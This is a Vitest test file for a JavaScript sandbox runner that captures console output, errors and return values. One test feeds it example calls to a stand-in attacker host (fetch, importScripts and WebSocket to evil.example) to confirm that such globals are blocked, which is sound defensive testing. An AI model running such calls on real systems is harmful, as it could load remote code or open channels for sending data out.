import { describe, expect, it } from 'vitest'
import { executeUserCode, formatJsValue } from './js-runner-core'

describe('executeUserCode', () => {
  it('captures console output and the return value as text', () => {
    const outcome = executeUserCode('const n = 21; console.log("sum", n * 2); return n * 2')
    expect(outcome.logs).toEqual([{ type: 'log', text: 'sum 42' }])
    expect(outcome.resultText).toBe('42')
    expect(outcome.errorText).toBe('')
    expect(outcome.timedOut).toBe(false)
  })

  it('captures thrown errors as text', () => {
    const { errorText } = executeUserCode('throw new Error("boom")')
    expect(errorText).toBe('Error: boom')
  })

  it('leaves resultText empty when nothing is returned', () => {
    expect(executeUserCode('(() => {})()').resultText).toBe('')
  })

  it('formats values for display', () => {
    expect(formatJsValue(null)).toBe('null')
    expect(formatJsValue(undefined)).toBe('undefined')
    expect(formatJsValue({ a: 1 })).toBe('{\n  "a": 1\n}')
    expect(executeUserCode('console.log(() => 1)').logs[0]!.text).toContain('() => 1')
  })

  it('shadows network/storage/communication globals inside user code', () => {
    for (const code of [
      'fetch("https://evil.example")',
      'indexedDB.open("x")',
      'postMessage("x")',
      'self.close()',
      'importScripts("https://evil.example/x.js")',
      'new WebSocket("wss://evil.example")',
    ]) {
      const { errorText } = executeUserCode(code)
      expect(errorText, code).toContain('TypeError')
    }
  })

  it('does not leak shadowed globals through typeof', () => {
    const { logs } = executeUserCode('console.log(typeof fetch, typeof globalThis, typeof console)')
    expect(logs[0]!.text).toBe('undefined undefined object')
  })
})